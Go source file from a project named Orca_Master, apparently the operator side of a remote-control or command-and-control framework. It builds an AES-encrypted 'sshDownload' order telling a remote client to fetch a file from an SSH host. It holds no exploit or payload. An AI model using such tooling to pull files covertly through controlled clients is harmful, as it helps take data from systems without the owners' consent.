package sshopt

import (
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/config"
	"Orca_Master/tools/crypto"
	"encoding/json"
)

type SshDownloadStruct struct {
	RequestFile fileopt.RequestFile
	SshStruct   SshOption
}

func SendDownloadRequestMsg(clientId, sendUserId, destFile, saveFile string, sshStruct SshOption) common.HttpRetData {
	msg := "sshDownload"
	requestFile := fileopt.RequestFile{DestFileName: destFile, SaveFileName: saveFile}
	sshDownloadStruct := SshDownloadStruct{
		RequestFile: requestFile,
		SshStruct:   sshStruct,
	}
	sshDownloadStructData, _ := json.Marshal(sshDownloadStruct)
	data, _ := crypto.Encrypt(sshDownloadStructData, []byte(config.AesKey))
	return common.SendSuccessMsg(clientId, sendUserId, msg, data, "")
}
